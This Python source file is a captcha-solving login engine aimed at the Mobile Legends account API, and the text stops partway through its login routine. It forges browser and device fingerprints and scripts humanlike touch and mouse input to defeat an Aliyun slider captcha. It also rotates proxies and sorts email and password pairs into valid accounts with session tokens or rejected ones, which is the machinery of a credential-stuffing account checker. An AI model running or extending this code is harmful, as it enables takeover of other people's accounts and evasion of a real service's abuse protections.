# language: Python, file: mlbb_solver.py, target: Python 3.10+
# Pure solve engine. No CLI, no bench, no farm loop. Loggable, silent.
import hashlib
import json
import logging
import math
import os
import random
import re
import time

try:
    from playwright.sync_api import sync_playwright
except Exception as _e:
    sync_playwright = None
    _PW_IMPORT_ERR = str(_e)
else:
    _PW_IMPORT_ERR = None

try:
    import cloakbrowser as _cloak
except Exception:
    _cloak = None

try:
    import requests
except Exception:
    requests = None

log = logging.getLogger('mlbb_solver')

LOGIN_URL = 'https://accountmtapi.mobilelegends.com'
MTACC_PAGE = 'https://mtacc.mobilelegends.com/v2.1/inapp/login-new'
UA = ("Mozilla/5.0 (Linux; Android 15; SM-A055F Build/AP3A.240905.015.A2; wv) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.199 "
      "Mobile Safari/537.36;UniWebView;mtakit")

CHROMIUM_ARGS = [
    '--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu',
    '--disable-software-rasterizer', '--disable-extensions',
    '--disable-background-networking', '--renderer-process-limit=1',
    '--disable-component-extensions-with-background-pages',
    '--disable-ipc-flooding-protection', '--js-flags=--max-old-space-size=256',
    '--disable-blink-features=AutomationControlled', '--disable-infobars',
    '--disable-background-timer-throttling',
    '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-background-page-throttling',
    '--disable-features=CalculateNativeWinOcclusion',
]

STEALTH_JS = """() => {
  Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  window.chrome = window.chrome || { runtime: {} };
  const origQuery = window.navigator.permissions && window.navigator.permissions.query;
  if (origQuery) {
    window.navigator.permissions.query = (p) => (
      p && p.name === 'notifications'
        ? Promise.resolve({ state: Notification.permission })
        : origQuery(p));
  }
  Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
  Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
  try { window.chrome.runtime = { id: undefined }; } catch (e) {}
}"""

FINGERPRINT_JS = """() => {
  const uaBrands = [
    { brand: 'Not(A:Brand', version: '24' },
    { brand: 'Chromium', version: '151' },
    { brand: 'Chrome', version: '151' },
  ];
  try {
    Object.defineProperty(navigator, 'platform', { get: () => 'Linux armv8l' });
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 4 });
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 });
    Object.defineProperty(navigator, 'language', { get: () => 'en-US' });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    Object.defineProperty(window, 'devicePixelRatio', { get: () => 2.625 });
  } catch (e) {}
  if (navigator.userAgentData) {
    try {
      Object.defineProperty(navigator, 'userAgentData', {
        value: {
          mobile: true, platform: 'Android', brands: uaBrands,
          getHighEntropyValues: () => Promise.resolve({
            architecture: 'arm', bitness: '64', brands: uaBrands,
            fullVersionList: uaBrands, model: 'SM-A055F', platform: 'Android',
            platformVersion: '15', uaFullVersion: '151.0.7922.199',
          }),
        },
      });
    } catch (e) {}
  }
  try {
    const glGet = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (p) {
      if (p === 37445) return 'Google Inc. (ARM)';
      if (p === 37446) return 'ANGLE (ARM, Mali-G52 MC1, OpenGL ES 3.2)';
      return glGet.call(this, p);
    };
    if (WebGL2RenderingContext) {
      const gl2Get = WebGL2RenderingContext.prototype.getParameter;
      WebGL2RenderingContext.prototype.getParameter = function (p) {
        if (p === 37445) return 'Google Inc. (ARM)';
        if (p === 37446) return 'ANGLE (ARM, Mali-G52 MC1, OpenGL ES 3.2)';
        return gl2Get.call(this, p);
      };
    }
  } catch (e) {}
  try {
    const origGetImageData = CanvasRenderingContext2D.prototype.getImageData;
    CanvasRenderingContext2D.prototype.getImageData = function () {
      const img = origGetImageData.apply(this, arguments);
      for (let i = 0; i < img.data.length; i += 1) {
        if (i % 61 === 0) img.data[i] = (img.data[i] + 3) & 0xff;
      }
      return img;
    };
  } catch (e) {}
  try {
    const toDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function () {
      const url = toDataURL.apply(this, arguments);
      return url.length > 64 ? url.slice(0, 32) + url.slice(33) : url;
    };
  } catch (e) {}
  try {
    const tzGet = Intl.DateTimeFormat.prototype.resolvedOptions;
    Intl.DateTimeFormat.prototype.resolvedOptions = function () {
      const o = tzGet.call(this);
      Object.defineProperty(o, 'timeZone', { value: 'Asia/Manila' });
      Object.defineProperty(o, 'locale', { value: 'en-US' });
      return o;
    };
  } catch (e) {}
}"""

CHROME_EXE_CANDIDATES = [
    r'C:\Program Files\Google\Chrome\Application\chrome.exe',
    r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe',
    r'C:\Program Files\Microsoft\Edge\Application\msedge.exe',
    r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe',
]

DRAG_PARAM_SCHEMA = {
    't_lo': (0.18, 1.30, float), 't_hi': (0.30, 1.70, float),
    'base_n': (6, 46, int), 'density': (0.015, 0.10, float),
    'accel_lo': (0.26, 0.48, float), 'accel_hi': (0.34, 0.60, float),
    'peak_lo': (1.6, 2.6, float), 'peak_hi': (1.8, 3.0, float),
    'wobble': (1.5, 4.5, float), 'rev_p': (0.0, 0.08, float),
    'micro_slow': (0.0, 0.07, float), 'hold_lo': (1, 9, int),
    'hold_hi': (2, 13, int), 's_hold_lo': (0.015, 0.22, float),
    's_hold_hi': (0.03, 0.30, float), 'settle_lo': (0.006, 0.16, float),
    'settle_hi': (0.012, 0.24, float), 'pre_clicks': (0, 5, int),
    'mid_clicks': (0, 5, int), 'pre_drag': (0.0, 1.5, float),
    'pre_scroll': (0.0, 1.0, float), 'post_sensor': (0, 2, int),
    'no_verify_delay': (0, 1, int),
}

def _seed_params(**kw):
    P = {
        't_lo': 0.45, 't_hi': 0.70, 'base_n': 14, 'density': 0.035,
        'accel_lo': 0.28, 'accel_hi': 0.40, 'peak_lo': 2.0, 'peak_hi': 2.5,
        'wobble': 2.6, 'rev_p': 0.0, 'micro_slow': 0.05,
        'hold_lo': 2, 'hold_hi': 4, 's_hold_lo': 0.04, 's_hold_hi': 0.09,
        'settle_lo': 0.014, 'settle_hi': 0.032,
        'pre_clicks': 3, 'pre_scroll': 0.2, 'post_sensor': 1,
        'mid_clicks': 0, 'pre_drag': 0.3, 'no_verify_delay': 0,
    }
    P.update(kw)
    return P

def _fill_schema_defaults(P):
    P = dict(P or {})
    base = _seed_params()
    for k in DRAG_PARAM_SCHEMA:
        if k not in P:
            P[k] = base[k]
    return P

_PARAM_VARIANTS = {'best': _seed_params()}
_DRAG_VARIANT = 'best'

def load_best_params(path=None):
    if path is None:
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            'best_drag_params.json')
    try:
        if not os.path.exists(path) or os.path.getsize(path) == 0:
            return None
        with open(path, encoding='utf-8') as f:
            data = json.load(f)
        if 'params' in data:
            _PARAM_VARIANTS['best'] = _fill_schema_defaults(data['params'])
            return data
    except Exception as e:
        log.warning('load_best_params failed: %s', e)
    return None

def set_drag_variant(name):
    global _DRAG_VARIANT
    if name in _PARAM_VARIANTS:
        _DRAG_VARIANT = name
        return True
    return False

def generate_sign(params):
    all_params = dict(params)
    all_params['op'] = 'new_login_pwd'
    raw = '&'.join(f'{k}={all_params[k]}' for k in sorted(all_params))
    return hashlib.md5(raw.encode()).hexdigest().lower()

def gen_payload(email, password):
    md5pwd = hashlib.md5(password.encode()).hexdigest().lower()
    params = {'account': email, 'country': '', 'md5pwd': md5pwd}
    return {'op': 'new_login_pwd', 'sign': generate_sign(params),
            'params': params, 'lang': 'en'}

VERDICT_MSGS = (
    'Error_PasswdError', 'Error_PasswordError', 'Error_NeedEmailCode',
    'Error_InvalidAccount', 'Error_AccountNotFound', 'Error_PassWordNeedReset',
)

def looks_real_json(text):
    if not text:
        return False
    t = text.lstrip()
    return t.startswith('{') and '"code"' in t[:200]

def classify_login(_js, raw):
    if not looks_real_json(raw):
        return {'status': 'error', 'error': 'waf_or_nonjson',
                'raw': (raw or '')[:200]}
    try:
        data = json.loads(raw)
    except Exception:
        return {'status': 'error', 'error': 'bad_json', 'raw': raw[:200]}
    code = data.get('code')
    msg = data.get('message', '')
    m = (msg or '').lower()
    if msg == 'Error_ECaptcha_VerifyFail':
        return {'status': 'captcha_fail', 'code': code, 'msg': msg,
                'message': msg}
    if code == 1013 or 'captcha' in m or 'ecaptcha' in m:
        return {'status': 'captcha', 'code': code, 'msg': msg}
    if code == 0 or msg == 'Error_Success':
        d = data.get('data', {}) or {}
        guid = d.get('guid') or data.get('guid')
        session = d.get('session') or data.get('session')
        if not session:
            return {'status': 'invalid', 'code': code, 'msg': msg,
                    'message': 'No session token'}
        return {'status': 'valid', 'guid': guid, 'session': session,
                'code': code, 'msg': msg, 'message': msg}
    for tok in VERDICT_MSGS:
        if tok.lower() in m:
            return {'status': 'invalid', 'code': code, 'msg': msg,
                    'message': msg, 'verdict': msg}
    label = msg or f'code {code}'
    if code is not None:
        label = f'{label} (code {code})'
    return {'status': 'error', 'error': 'server_code', 'code': code,
            'msg': msg, 'message': label}

def _apply_delay_patch(html):
    P = _PARAM_VARIANTS.get(_DRAG_VARIANT)
    if not P or not P.get('no_verify_delay'):
        return html
    return html.replace(
        'initAliyunCaptcha(captchaOptions)',
        'initAliyunCaptcha(Object.assign({delayBeforeSuccess:false},'
        'captchaOptions))')

def _rewrite_challenge(html):
    html = re.sub(r'<script src="(/[^"]+)"',
                  r'<script src="https://accountmtapi.mobilelegends.com\1"',
                  html)
    html = _apply_delay_patch(html)
    base = '<base href="https://accountmtapi.mobilelegends.com/">'
    m = re.search(r'<head[^>]*>', html, flags=re.I)
    if m is not None:
        return html[:m.end()] + base + html[m.end():]
    m = re.search(r'<!doctype[^>]*>', html, flags=re.I)
    return html[:m.end()] + base + html[m.end():]


class SolverSession:
    def __init__(self, proxy=None, headless=True, transport='chromium'):
        self.proxy = proxy
        self.headless = headless
        self.transport = transport
        self.browser = None
        self.ctx = None
        self.page = None
        self.cookies = {}
        self.certify_ids = []
        self.real_json = []
        self.last_challenge = ''
        self._started = False
        self.last_drag_metrics = {}
        self._prefetched = None
        self._submit_asig = None
        self._submit_token = None
        self._pw = None

    def start(self):
        if self.transport == 'chromium':
            if sync_playwright is None:
                raise RuntimeError(f'playwright not importable: {_PW_IMPORT_ERR}')
            self._pw = sync_playwright().start()
            launch_kw = dict(headless=self.headless, args=list(CHROMIUM_ARGS))
            for cand in CHROME_EXE_CANDIDATES:
                if os.path.exists(cand):
                    launch_kw['executable_path'] = cand
                    break
            self.browser = self._pw.chromium.launch(**launch_kw)
        else:
            if _cloak is None:
                raise RuntimeError('cloakbrowser not importable')
            self.browser = _cloak.launch(headless=self.headless,
                                          humanize=True,
                                          args=['--disable-dev-shm-usage'])
        ctx_kw = dict(
            user_agent=UA, locale='en-US',
            viewport={'width': 412, 'height': 915},
            is_mobile=True, has_touch=True,
            ignore_https_errors=True, color_scheme='light',
        )
        if self.proxy:
            ctx_kw['proxy'] = self.proxy
        self.ctx = self.browser.new_context(**ctx_kw)
        if self.transport == 'chromium':
            try:
                self.ctx.add_init_script(STEALTH_JS)
                self.ctx.add_init_script(FINGERPRINT_JS)
            except Exception as e:
                log.debug('init script failed: %s', e)
        self.page = self.ctx.new_page()
        self.real_json = []
        self.certify_ids = []
        self._submit_asig = None
        self._submit_token = None
        self.last_challenge = ''
        self._prefetched = None
        self.page.on('response', self._on_response)
        try:
            self.page.route('**/*u_asig=*', self._route_submit)
        except Exception as e:
            log.debug('route init failed: %s', e)
        if not self._prime():
            try:
                self.browser.close()
            except Exception:
                pass
            self.browser = None
            self.ctx = None
            self.page = None
            self._started = False
            raise RuntimeError('prime failed')
        self._started = True

    def _prime(self):
        try:
            self.page.goto(MTACC_PAGE, wait_until='domcontentloaded',
                           timeout=60000)
            self.page.wait_for_timeout(250)
        except Exception as e:
            log.debug('prime goto failed: %s', e)
            return False
        if not self._alive():
            return False
        self._snap_cookies()
        return True

    def _alive(self, fast=False):
        try:
            if fast:
                return not self.page.is_closed()
            self.page.wait_for_timeout(50)
            self.page.evaluate('1')
            return True
        except Exception:
            return False

    def close(self):
        if self.browser:
            try:
                self.browser.close()
            except Exception:
                pass
            self.browser = None
            self.ctx = None
            self.page = None
            self._started = False
        if self._pw:
            try:
                self._pw.stop()
            except Exception:
                pass
            self._pw = None

    def _snap_cookies(self):
        out = {}
        try:
            for c in self.ctx.cookies():
                out[c['name']] = c['value']
        except Exception:
            pass
        self.cookies = out

    def _cookie_header(self):
        return '; '.join(f'{k}={v}' for k, v in self.cookies.items())

    def _on_response(self, resp):
        try:
            u = resp.url
            if resp.status == 405 and ('u_asig=' in u or 'u_atoken=' in u):
                ma = re.search(r'[?&]u_asig=([a-zA-Z0-9]+)', u)
                mt = re.search(r'[?&]u_atoken=([a-zA-Z0-9]+)', u)
                if ma:
                    self._submit_asig = ma.group(1)
                if mt:
                    self._submit_token = mt.group(1)
            if 'captcha-open' in u:
                body = resp.text()
                c = re.findall(r'"[Cc]ertifyId":"([a-zA-Z0-9]{8,})"', body)
                if c:
                    self.certify_ids.extend(c)
            if LOGIN_URL.rstrip('/') in u and resp.ok:
                body = resp.text()
                if looks_real_json(body):
                    self.real_json.append(body)
        except Exception:
            pass

    def _route_submit(self, route):
        try:
            u = route.request.url
            if 'u_asig=' in u or 'u_atoken=' in u:
                ma = re.search(r'[?&]u_asig=([a-zA-Z0-9]+)', u)
                mt = re.search(r'[?&]u_atoken=([a-zA-Z0-9]+)', u)
                if ma:
                    self._submit_asig = ma.group(1)
                if mt:
                    self._submit_token = mt.group(1)
                route.fulfill(status=200,
                              headers={'Content-Type': 'text/html'},
                              body='<html></html>')
                return
        except Exception as e:
            log.debug('route err: %s', e)
        try:
            route.continue_()
        except Exception:
            pass

    def _try_post(self, payload, url=None):
        self._snap_cookies()
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://mtacc.mobilelegends.com',
            'X-Requested-With': 'com.mobile.legends',
            'Referer': 'https://mtacc.mobilelegends.com/',
            'User-Agent': UA,
            'Cookie': self._cookie_header(),
        }
        r = self.ctx.request.fetch(url or (LOGIN_URL + '/'),
                                   method='POST', headers=headers,
                                   data=json.dumps(payload),
                                   timeout=20000)
        self._snap_cookies()
        return r.text()

    def prefetch_next(self, payload):
        if not requests or not self._started:
            return
        try:
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://mtacc.mobilelegends.com',
                'X-Requested-With': 'com.mobile.legends',
                'Referer': 'https://mtacc.mobilelegends.com/',
                'User-Agent': UA,
                'Cookie': '; '.join(f'{k}={v}'
                                    for k, v in self.cookies.items()),
            }
            kw = dict(method='POST', headers=headers,
                      data=json.dumps(payload), timeout=20)
            if self.proxy:
                srv = self.proxy.get('server', '')
                kw['proxies'] = {'http': srv, 'https': srv}
            r = requests.post(LOGIN_URL + '/', **kw)
            body = r.text if r.ok else ''
            if not body:
                return
            if not looks_real_json(body) and 'aliyunCaptcha' not in body:
                return
            key = json.dumps(payload, sort_keys=True)
            self._prefetched = (key, body)
        except Exception as e:
            log.debug('prefetch failed: %s', str(e)[:80])

    def _cdp(self):
        return self.ctx.new_cdp_session(self.page)

    def _ev_touch(self, cdp, t, x, y, keep=False):
        pts = [{'x': x, 'y': y, 'radiusX': 6, 'radiusY': 6, 'force': 1,
                'id': 1}] if not keep else []
        try:
            cdp.send('Input.dispatchTouchEvent',
                     {'type': t, 'touchPoints': pts})
            return True
        except Exception:
            return False

    def _y_wobble(self, dist, x, sy, amp=3.5):
        px = max(0.0, min(1.0, x / max(dist, 1)))
        arc = math.sin(math.pi * px) * amp
        return sy + arc + random.gauss(0, 0.45)

    def _bezier_points(self, x1, y1, x2, y2, steps):
        cx1 = x1 + random.randint(-40, 40)
        cy1 = y1 + random.randint(-30, 30)
        cx2 = x2 + random.randint(-40, 40)
        cy2 = y2 + random.randint(-30, 30)
        pts = []
        for i in range(steps + 1):
            t = i / steps
            u = 1 - t
            px = int(u ** 3 * x1 + 3 * u ** 2 * t * cx1
                     + 3 * u * t ** 2 * cx2 + t ** 3 * x2)
            py = int(u ** 3 * y1 + 3 * u ** 2 * t * cy1
                     + 3 * u * t ** 2 * cy2 + t ** 3 * y2)
            px = max(5, min(px, 412 - 5))
            py = max(5, min(py, 915 - 5))
            pts.append((px, py))
        return pts

    def _sensor_feel(self, light=False):
        try:
            cdp = self.ctx.new_cdp_session(self.page)
            vw, vh = 412, 915
            x1, y1 = random.randint(60, vw - 120), random.randint(60, vh - 200)
            x2, y2 = random.randint(60, vw - 80), random.randint(60, vh - 120)
            pts = self._bezier_points(x1, y1, x2, y2,
                                      steps=random.randint(9, 16))
            n = len(pts)
            for i, (px_, py_) in enumerate(pts):
                cdp.send('Input.dispatchMouseEvent',
                         {'type': 'mouseMoved', 'x': px_, 'y': py_})
                frac = i / max(n - 1, 1)
                time.sleep(random.uniform(0.005, 0.014)
                           * (1.0 + (1.0 - frac) ** 2) * 1.4)
            if random.random() < 0.45:
                self._wheel_scroll(cdp, steps=random.randint(3, 6))
            if not light:
                self.page.evaluate("""() => {
                  const t = (x, y) => ({
                    pointerId: 1, bubbles: true, clickCount: 1,
                    clientX: x, clientY: y, screenX: x, screenY: y,
                    button: 0, buttons: 1, pointerType: 'mouse',
                    isPrimary: true });
                  const mx = 60 + Math.random()*300, my = 60 + Math.random()*500;
                  document.dispatchEvent(new PointerEvent('pointerover', t(mx,my)));
                  document.dispatchEvent(new PointerEvent('pointerenter', t(mx,my)));
                  document.dispatchEvent(new PointerEvent('pointermove',
                    { pointerId: 1, bubbles: true, clientX: mx, clientY: my,
                      screenX: mx, screenY: my }));
                  document.dispatchEvent(new PointerEvent('pointerdown', t(mx,my)));
                  document.dispatchEvent(new MouseEvent('mousedown', {
                    bubbles: true, cancelable: true, clientX: mx, clientY: my,
                    screenX: mx, screenY: my, button: 0, buttons: 1 }));
                  setTimeout(function(){
                    document.dispatchEvent(new PointerEvent('pointerup', t(mx,my)));
                    document.dispatchEvent(new MouseEvent('mouseup', {
                      bubbles: true, cancelable: true, clientX: mx, clientY: my,
                      screenX: mx, screenY: my, button: 0, buttons: 0 }));
                    document.dispatchEvent(new PointerEvent('pointerleave',
                      { pointerId: 1, bubbles: false, clientX: mx, clientY: my }));
                  }, 60 + Math.random()*140);
                  ['keydown','keyup'].forEach(function(evt){
                    document.dispatchEvent(new KeyboardEvent(evt, {
                      key: 'a', code: 'KeyA', keyCode: 65, bubbles: true}));
                  });
                }""")
        except Exception:
            pass

    def _wheel_scroll(self, cdp, total=None, steps=None):
        x = random.randint(170, 270)
        y = random.randint(160, 470)
        if total is None:
            total = random.choice([-180, -140, -100, -70, 60, 90, 130, 170])
        if steps is None:
            steps = random.randint(4, 8)
        prev_f = 0.0
        for i in range(1, steps + 1):
            t = i / steps
            f = t * t * (3 - 2 * t)
            tick = total * (f - prev_f)
            prev_f = f
            cdp.send('Input.dispatchMouseEvent', {
                'type': 'mouseWheel',
                'x': x + random.randint(-2, 2),
                'y': y + random.randint(-2, 2),
                'deltaX': 0, 'deltaY': round(tick, 1)})
            time.sleep(random.uniform(0.04, 0.11))
        time.sleep(random.uniform(0.04, 0.10))

    def _pre_scroll(self):
        try:
            if not (self.ctx and self.page):
                return
            cdp = self.ctx.new_cdp_session(self.page)
            self._wheel_scroll(cdp)
        except Exception:
            pass

    def _human_click(self, cdp, x, y, prev=None):
        try:
            if prev is None:
                prev = (random.randint(24, 120), random.randint(80, 320))
            pts = self._bezier_points(prev[0], prev[1], x, y,
                                      steps=random.randint(14, 24))
            n = len(pts)
            for i, (px, py) in enumerate(pts):
                cdp.send('Input.dispatchMouseEvent',
                         {'type': 'mouseMoved', 'x': px, 'y': py})
                frac = i / max(n - 1, 1)
                time.sleep(random.uniform(0.004, 0.010)
                           * (1.0 + (1.0 - frac) ** 2) * 1.8)
            time.sleep(random.uniform(0.035, 0.085))
            enter_js = """(x, y) => {
              const el = document.elementFromPoint(x, y) || document.body;
              const mp = { bubbles: true, cancelable: true,
                           clientX: x, clientY: y };
              el.dispatchEvent(new PointerEvent('pointerover', mp));
              el.dispatchEvent(new MouseEvent('mouseover', mp));
              el.dispatchEvent(new PointerEvent('pointerenter', mp));
              el.dispatchEvent(new MouseEvent('mouseenter', mp));}"""
            down_js = """(x, y) => {
              const el = document.elementFromPoint(x, y) || document.body;
              el.dispatchEvent(new PointerEvent('pointerdown', {
                bubbles: true, cancelable: true, pointerType: 'mouse',
                isPrimary: true, clientX: x, clientY: y, button: 0,
                buttons: 1 }));
              el.dispatchEvent(new MouseEvent('mousedown', {
                bubbles: true, cancelable: true, clientX: x, clientY: y,
                button: 0, buttons: 1 }));}"""
            up_js = """(x, y) => {
              const el = document.elementFromPoint(x, y) || document.body;
              el.dispatchEvent(new PointerEvent('pointerup', {
                bubbles: true, cancelable: true, pointerType: 'mouse',
                clientX: x, clientY: y, button: 0, buttons: 0 }));
              el.dispatchEvent(new MouseEvent('mouseup', {
                bubbles: true, cancelable: true, clientX: x, clientY: y,
                button: 0, buttons: 0 }));
              el.dispatchEvent(new PointerEvent('pointerleave',
                { bubbles: false, clientX: x, clientY: y }));
              el.dispatchEvent(new MouseEvent('mouseleave',
                { bubbles: false, clientX: x, clientY: y }));}"""
            self.page.evaluate(enter_js, x, y)
            hold = random.uniform(0.06, 0.16)
            cdp.send('Input.dispatchMouseEvent',
                     {'type': 'mousePressed', 'x': x, 'y': y,
                      'button': 'left', 'buttons': 1, 'clickCount': 1})
            self.page.evaluate(down_js, x, y)
            time.sleep(hold)
            cdp.send('Input.dispatchMouseEvent',
                     {'type': 'mouseReleased', 'x': x, 'y': y,
                      'button': 'left', 'buttons': 0, 'clickCount': 1})
            self.page.evaluate(up_js, x, y)
            return (x, y)
        except Exception:
            return prev

    def _click_around(self, n=3):
        try:
            if not (self.ctx and self.page) or n < 1:
                return
            cdp = self.ctx.new_cdp_session(self.page)
            vw, vh = 412, 915
            zones = [
                (random.randint(30, vw - 60), random.randint(42, 110)),
                (random.randint(30, vw - 60), random.randint(vh - 150, vh - 40)),
                ((random.randint(8, 44) if random.random() < 0.5
                  else random.randint(vw - 44, vw - 8)),
                 random.randint(200, vh - 200)),
                (random.randint(60, vw - 120), random.randint(120, 260)),
                (random.randint(60, vw - 120), random.randint(600, vh - 220)),
            ]
            prev = None
            for (cx, cy) in random.sample(zones, min(n, len(zones))):
                prev = self._human_click(cdp, cx, cy, prev)
                time.sleep(random.uniform(0.05, 0.13))
        except Exception:
            pass

    def _quick_tap(self):
        try:
            if not (self.ctx and self.page):
                return
            cdp = self.ctx.new_cdp_session(self.page)
            vw, vh = 412, 915
            if random.random() < 0.6:
                x = random.choice([random.randint(14, 92),
                                   random.randint(vw - 92, vw - 14)])
                y = random.randint(58, 420)
            else:
                x = random.randint(30, vw - 30)
                y = random.randint(430, vh - 96)
            px0, py0 = random.randint(24, 120), random.randint(80, 360)
            steps = random.randint(3, 4)
            for i in range(1, steps + 1):
                f = i / steps
                cdp.send('Input.dispatchMouseEvent',
                         {'type': 'mouseMoved',
                          'x': int(px0 + (x - px0) * f),
                          'y': int(py0 + (y - py0) * f)})
                time.sleep(random.uniform(0.006, 0.012))
            down = """(x, y) => {
              const el = document.elementFromPoint(x, y) || document.body;
              el.dispatchEvent(new PointerEvent('pointerdown', {
                bubbles: true, cancelable: true, pointerType: 'mouse',
                clientX: x, clientY: y, button: 0, buttons: 1 }));
              el.dispatchEvent(new MouseEvent('mousedown', {
                bubbles: true, cancelable: true, clientX: x, clientY: y,
                button: 0, buttons: 1 }));}"""
            up = """(x, y) => {
              const el = document.elementFromPoint(x, y) || document.body;
              el.dispatchEvent(new PointerEvent('pointerup', {
                bubbles: true, cancelable: true, pointerType: 'mouse',
                clientX: x, clientY: y, button: 0, buttons: 0 }));
              el.dispatchEvent(new MouseEvent('mouseup', {
                bubbles: true, cancelable: true, clientX: x, clientY: y,
                button: 0, buttons: 0 }));
              el.dispatchEvent(new PointerEvent('pointerleave',
                { bubbles: false, clientX: x, clientY: y }));
              el.dispatchEvent(new MouseEvent('mouseleave',
                { bubbles: false, clientX: x, clientY: y }));}"""
            self.page.evaluate(down, x, y)
            time.sleep(random.uniform(0.045, 0.075))
            self.page.evaluate(up, x, y)
        except Exception:
            pass

    def _trajectory_3phase(self, dist, sy, P, t_total):
        wob = P['wobble']
        fracs = []
        x = 0.0
        accel_frac = random.uniform(P['accel_lo'], P['accel_hi'])
        n1 = random.randint(2, 3)
        for i in range(n1):
            x += random.uniform(4.0, 9.0) * (1 + i * 0.6)
            if x > dist * accel_frac:
                x = dist * accel_frac
                break
            fracs.append(('S', x))
        n2 = random.randint(4, 7)
        rem = dist - x
        for i in range(n2):
            step = rem / (n2 - i) * random.uniform(0.8, 1.2)
            if step < 4.0 or x + step >= dist - 1.0:
                break
            x += step
            fracs.append(('M', x))
        fracs.append(('O', dist + random.uniform(1.5, 4.0)))
        fracs.append(('O', dist + random.uniform(-1.0, 1.0)))
        base = {'S': random.uniform(0.020, 0.040),
                'M': random.uniform(0.005, 0.011),
                'O': random.uniform(0.025, 0.050)}
        s = sum(base[p] for p, _ in fracs)
        k = t_total / max(s, 1e-3)
        pts = []
        for (p, xp) in fracs:
            amp = wob * (0.55 if p == 'M' else (0.3 if p == 'O' else 1.0))
            pts.append((xp, self._y_wobble(dist, xp, sy, amp=amp),
                        base[p] * k * random.uniform(0.9, 1.1)))
        return pts

    def _drag_param(self, sx, sy, dist, P):
        cdp = self._cdp()
        end = sx + dist
        try:
            t_total = random.uniform(P['t_lo'], P['t_hi'])
            pts = self._trajectory_3phase(dist, sy, P, t_total)
            pre_drag = P.get('pre_drag', 0.0)
            if pre_drag:
                time.sleep(random.uniform(pre_drag, pre_drag * 1.6))
            self._ev_touch(cdp, 'touchStart', sx, sy)
            time.sleep(random.uniform(P['s_hold_lo'], P['s_hold_hi']))
            mid_n = int(P.get('mid_clicks', 0))
            mid_at = set()
            if mid_n > 0 and len(pts) > 6:
                mid_at = set(random.sample(range(2, max(3, len(pts) - 3)),
                                          min(mid_n, max(1, len(pts) - 5))))
            for i, (px, py, delay) in enumerate(pts):
                self._ev_touch(cdp, 'touchMove', sx + px, py)
                if i in mid_at:
                    self._quick_tap()
                    time.sleep(random.uniform(0.03, 0.06))
                time.sleep(delay)
            for _rep in range(random.randint(P['hold_lo'], P['hold_hi'])):
                self._ev_touch(cdp, 'touchMove', end + random.uniform(-0.9, 0.9),
                               sy + random.gauss(0, 0.5))
                time.sleep(random.uniform(P['settle_lo'], P['settle_hi']))
            self._ev_touch(cdp, 'touchMove', end, sy)
            time.sleep(random.uniform(0.03, 0.10))
            self._ev_touch(cdp, 'touchEnd', end, sy, keep=True)
            return True
        except Exception as e:
            log.debug('drag err: %s', e)
            return False

    def _wait_slider(self):
        try:
            self.page.wait_for_selector('#aliyunCaptcha-sliding-slider',
                                        timeout=8000, state='attached')
            return True
        except Exception:
            return False

    def drag_slider(self, payload=None):
        t_start = time.time()
        P = _PARAM_VARIANTS.get(_DRAG_VARIANT)
        if P is None:
            return False
        try:
            slider = self.page.query_selector('#aliyunCaptcha-sliding-slider')
            if not slider:
                return True
            box = slider.bounding_box()
            if not box:
                return False
            track = self.page.query_selector(
                '#aliyunCaptcha-sliding-body, #aliyunCaptcha-sliding-track')
            tbox = track.bounding_box() if track else box
            sx = box['x'] + box['width'] / 2
            sy = box['y'] + box['height'] / 2
            dist = (tbox['x'] + tbox['width'] - box['width'] / 2
                    - (box['x'] + box['width'] / 2))
            pre_cert = len(self.certify_ids)
            if random.random() < P['pre_scroll']:
                self._pre_scroll()
            self._drag_param(sx, sy, dist, P)
            if P['post_sensor'] >= 1:
                self._sensor_feel(P['post_sensor'] < 2)
            confirmed = False
            for i in range(8):
                if self.real_json or len(self.certify_ids) > pre_cert:
                    confirmed = True
                    break
                if i % 2 == 0 or i == 7:
                    st = None
                    try:
                        st = self.page.evaluate(
                            """()=>{const e=document.getElementById('aliyunCaptcha-sliding-left');
                              const f=document.getElementById('aliyunCaptcha-sliding-failTip');
                              return {left:e?e.getBoundingClientRect().width:0,
                                      fail:(f&&f.textContent)||''};}""")
                    except Exception:
                        pass
                    if st and st.get('left', 0) >= (tbox['width'] - 2):
                        confirmed = True
                        break
                    if st and ('fail' in (st.get('fail') or '').lower()
                               or 'retry' in (st.get('fail') or '').lower()):
                        break
                self.page.wait_for_timeout(80)
            solved = confirmed
            self.last_drag_metrics = {
                'variant': _DRAG_VARIANT,
                'drag_s': time.time() - t_start,
                'solved': solved,
            }
            return solved or bool(self.real_json) or bool(self.certify_ids)
        except Exception as e:
            log.debug('drag_slider exc: %s', e)
            return False

    def _native_submit(self, payload):
        cert = self._submit_asig or (self.certify_ids[-1]
                                     if self.certify_ids else None)
        tok = self._submit_token
        if not tok:
            m = re.search(r'["\']token["\']\s*[:=]\s*["\']([a-zA-Z0-9]+)["\']',
                          self.last_challenge or '')
            if m:
                tok = m.group(1)
        if not tok or not cert:
            return self._try_post(payload)
        return self._try_post(payload,
                              url=f'{LOGIN_URL}/?u_atoken={tok}&u_asig={cert}')

    def _reset_challenge(self):
        try:
            self.page.goto('about:blank', wait_until='commit')
        except Exception:
            pass
        self.page.wait_for_timeout(80)

    def solve_login(self, payload, retries=2):
        self.real_json = []
        self.last_challenge = ''
        self._submit_asig = None
        self._submit_token = None
        key = json.dumps(payload, sort_keys=True)
        result = None
        if self._prefetched and self._prefetched[0] == key:
            result = self._prefetched[1]
